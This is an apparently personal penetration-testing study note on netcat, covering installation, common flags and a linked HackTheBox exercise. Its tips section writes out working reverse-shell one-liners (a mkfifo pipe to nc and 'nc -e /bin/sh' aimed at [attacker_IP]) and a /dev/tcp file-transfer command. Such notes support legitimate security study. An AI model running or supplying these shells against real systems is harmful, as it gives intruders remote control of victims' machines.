---
tags:
  - 🛠️
up:
  - "[[02 - Remote Code Execution]]"
  - "[[02 - Data Exfiltration]]"
aliases: []
creation_date: 2026-03-11
last_modified: 2026-03-11
---
# 🛠️ [[(incomplete) Netcat]]
**Primary:** [[01 - Web Security]], [[01 - Network Security]]
 
**Secondary:** [[02 - Data Exfiltration]], [[02 - Remote Code Execution]]

## Installation
```bash
sudo apt install netcat
````

## Common Flags
|Flag|Description|
|---|---|
|`-l`|Listen mode, for inbound connections|
|`-p`|Local port number|
|`-v`|Verbose output|
|`-n`|Numeric-only IP addresses (no DNS lookups)|
|`-u`|UDP mode (default is TCP)|
|`-z`|Zero-I/O mode (used for scanning)|
|`-w`|Timeout for connections and final network reads|
|`-e`|Program to execute after connection (dangerous, often used for reverse shells)|

## Tips & Tricks
### Reverse Shell
**Attacker machine**
```bash
netcat -nvlp [port]
```

**Victim machine**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_IP] [port] >/tmp/f
```
If the victim has the correct netcat version installed (one that has `-e` flag)
```bash
nc -e /bin/sh [attacker_IP] [port]
```

### File Upload
**Attacker machine**
```bash
netcat -nvlp [port] < [in_file]
```

**Victim machine**
```
cat - < /dev/tcp/[attacker_IP]/[port] > [out_file]
```

## Related Usage


### CTFs
[[HTB - GiveBack]]

### Techniques
[[(incomplete) Port Forwarding]]


---

**References:** [Link](https://www.google.com/search?q=url)